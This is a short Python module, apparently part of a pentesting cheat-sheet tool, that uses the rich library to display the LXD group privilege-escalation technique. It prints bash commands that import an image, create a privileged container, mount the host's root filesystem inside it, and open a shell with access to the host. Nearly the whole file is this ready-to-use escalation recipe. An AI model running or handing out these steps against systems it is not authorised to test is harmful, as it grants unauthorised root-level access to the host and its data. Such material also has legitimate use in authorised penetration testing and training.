from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()


def run(data, cred, args):
    console.print(
        Panel.fit(
            "[bold cyan]Linux Daemon (LXD/LXC)[/bold cyan]\n"
            "Exploit LXD group membership by creating a privileged container.",
            border_style="cyan",
        )
    )

    commands = """# Check group membership
id

# List available images
lxc image list

# Import image (if needed)
lxc image import <IMAGE>.tar.gz --alias alpine

# Create privileged container
lxc init alpine privesc -c security.privileged=true

# Mount host filesystem
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start container
lxc start privesc

# Spawn shell
lxc exec privesc /bin/sh

# Access host filesystem
cd /mnt/root
"""

    console.print(
        Syntax(
            commands,
            "bash",
            theme="monokai",
            line_numbers=False,
        )
    )
